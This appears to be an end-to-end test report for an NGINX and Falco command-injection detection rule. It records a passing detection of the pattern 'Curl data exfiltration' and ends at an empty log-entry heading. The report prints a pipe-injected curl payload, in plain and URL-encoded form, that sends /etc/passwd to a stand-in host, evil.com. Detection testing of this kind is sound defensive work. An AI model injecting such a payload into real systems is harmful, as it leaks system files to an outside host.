name: test_e2e_with_logs[475_CMDI_CURL_001]
description:
## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMDI_CURL_001` |
| **Name** | Curl data exfiltration |
| **Category** | CMDINJ |
| **Subcategory** | data_exfil |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `|curl http://evil.com/exfil?d=$(cat /etc/passwd)`
- **Encoded**: `%7Ccurl%20http%3A%2F%2Fevil.com%2Fexfil%3Fd%3D%24%28cat%20%2Fetc%2Fpasswd%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~32000ms
- **Timestamp**: 11:55:27.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via pipe` |
| **Matched Rule** | `[NGINX CMDi] Command injection via pipe test_id=CMDI_CURL_001-1772193327171-k2u64f pattern_id=CMDI_CURL_001 uri=/?q=%7Ccurl%20http%3A%2F%2Fevil.com%2Fexfil%3Fd%3D%24%28cat%20%2Fetc%2Fpasswd%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via pipe test_id=CMDI_CURL_001-1772193327171-k2u64f pattern_id=CMDI_CURL_001 uri=/?q=%7Ccurl%20http%3A%2F%2Fevil.com%2Fexfil%3Fd%3D%24%28cat%20%2Fetc%2Fpasswd%29 client=127.0.0.1

**Falco Log Entry**:
